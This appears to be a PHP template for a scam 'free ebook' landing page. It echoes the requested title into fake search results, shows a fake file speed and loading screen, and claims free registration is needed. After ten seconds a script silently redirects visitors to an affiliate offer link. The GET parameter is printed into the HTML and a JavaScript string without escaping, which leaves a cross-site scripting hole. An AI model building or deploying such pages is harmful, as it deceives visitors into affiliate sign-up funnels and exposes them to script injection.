<?php
$ab = array('-','.pdf');
$this_title= str_replace($ab, ' ', $_GET['title']);
$page_title= ucwords($this_title);
$angka = strlen($this_title);
?>
<!DOCTYPE html>
<html class="no-js en">
<meta charset="utf-8">
<meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1">
<meta name=robots content="NOINDEX, NOFOLLOW" />
<title>Now Reading <?php echo ucwords($page_title); ?></title>
<link rel=stylesheet href="/css/nganu.css">
<script src="//s3.amazonaws.com/framework_foundation/js/lib/custom.modernizr.min.js"></script>
<link href=//fonts.googleapis.com/css?family=Open+Sans:400,600,700 rel=stylesheet >
<link rel="shortcut icon" href="https://s3.amazonaws.com/imp_bucket2/images/urbooklibrary.com/urbooklibrary-logo.png" />

<link rel="canonical" href="http://hlok.qertewrt.com/offer?prod=2&ref=5045933&q=<?php echo strtolower($page_title); ?>"/>

<noscript>
<?php
/*<meta http-equiv="refresh" content="10;URL=http://hlok.qertewrt.com/offer?prod=2&ref=5045933&sub_id=cj_pdf&q=<?php echo strtolower($page_title); ?>">


<meta http-equiv="refresh" content="15;URL=http://hlok.qertewrt.com/offer?prod=2&ref=5045933&sub_id=cj_pdf&q=<?php echo strtolower($page_title); ?>">

*/
?>
</noscript>
<script type="text/javascript">
var url = "http://hlok.qertewrt.com/offer?prod=2&ref=5045933&q=<?php echo strtolower($page_title); ?>";
var delay = "10000";

window.onload = function ()
{
	DoTheRedirect()
}
function DoTheRedirect()
{
	setTimeout(GoToURL, delay)
}
function GoToURL()
{
	// IE8 and lower fix
	if (navigator.userAgent.match(/MSIE\s(?!9.0)/))
	{
		var referLink = document.createElement("a");
		referLink.href = url;
		document.body.appendChild(referLink);
		referLink.click();
	}

	// All other browsers
	else { window.location.replace(url); }
}
</script>
<!--REDIRECTING ENDS-->

<body>
<header>
 
  <div class="row text-center">
    <div class="small-12 columns search">Download Ebooks:</div>
    <div class="small-12 columns keyword">
      <h2 id="keyword"><?php echo ucwords($page_title); ?></h2>
    </div>
    <div class="small-12 columns found" id="found">Found <?php echo $angka;?> related Books</div>
  </div>
</header>
<div class="row reader">
  <div class="ripple"></div>
  <div class="ripple"></div>
  <div class="ripple"></div>
  <div class="small-12 columns frame">
    <div class="row controls">
      <div class="small-12 medium-4 push-8 columns settings">
        <ul class="small-block-grid-4">
          <li class="icon-aa"></li>
          <li class="icon-search"></li>
          <li class="icon-list"></li>
          <li class="icon-bookmark"></li>
        </ul>
      </div>
      <div class="small-12 medium-8 pull-4 columns warning">
        <div class="small-2 medium-1 columns icon-warning"></div>
        <div class="small-10 medium-11 columns">
          <p><span>You are about to access related books.</span>Access Speed for this file: 4148 KB/Sec</p>
        </div>
      </div>
    </div>
    <div class="row book">
      <div class="small-12 columns">
        <div class="previous"><span class="icon-left"></span></div>
        <div class="small-12 columns loading">Loading
          <ul id="loading" class="small-centered small-block-grid-6">
            <li><span></span></li>
            <li><span></span></li>
            <li><span></span></li>
            <li><span></span></li>
            <li><span></span></li>
            <li><span></span></li>
          </ul>
        </div>
        <div class="small-12 columns"><img src="/images/page1.jpg" alt=""></div>
        <div class="next"><span class="icon-right"></span></div>
        <div id="account" class="reveal-modal" data-reveal>
          <div class="row">
            <div class="small-12 medium-4 columns text-center"><img src="/images/book-icon.png" alt=""></div>
            <div class="small-12 medium-8 columns">
							<h2 id="keyword" style="font-size:15px;font-weight:bold;">Free Membership Registration to Download</h2>
              <p>Our library can be accessed from certain countries only.</p>
              <p>Please, see if you are eligible to <span class=bold>read</span> or <span class=bold>download</span> our <?php echo ucwords($page_title); ?> content by creating an account.</p>
              <p>You must create a <span>free</span> account in order to <span class=blue>read</span> or <span class=blue>download</span> this book.</p>
            </div>
          </div>
          <div class="row">
            <div class="small-12 colums text-center"><a href="http://hlok.qertewrt.com/offer?prod=2&ref=5045933&q=<?php echo strtolower($page_title); ?>" id="continue" class="x-domain">Continue</a></div>
          </div>
        </div>
      </div>
    </div>
    <div class="row progress">
      <div class="small-3 medium-2 large-1 columns page"><span>01</span></div>
      <div class="small-6 medium-8 large-10 columns bar">
        <div class="loading">
          <div class="buffer"></div>
          <div class="cursor"></div>
        </div>
      </div>
      <div class="small-3 medium-2 large-1 columns total">274</div>
    </div>
  </div>
</div>
<footer>
  <div class="row text-center">
    <div class="small-12 columns secure">
      <p>Your Ebooks Library!</p>
    </div>
    <div class="small-12 columns"><img src="/images/disclaimer-old.png" alt=""></div>
    <div class="small-12 columns disclaimer"><span><?php echo $_SERVER['SERVER_NAME']; ?> matches keywords, searched from 3rd-party sites, to affiliate-networks offering unlimited access to licensed entertainment content.</span> <span><?php echo $_SERVER['SERVER_NAME']; ?> allows visitors, otherwise looking for free-content to enjoy more for less.</span></div>
    
  </div>
</footer>
</div>
<script src="/js/sizzle.js"></script>
<script src=//ajax.googleapis.com/ajax/libs/webfont/1.4.2/webfont.js ></script>
<script>WebFont.load({google: {families: ['Open Sans']}});</script>


</body>
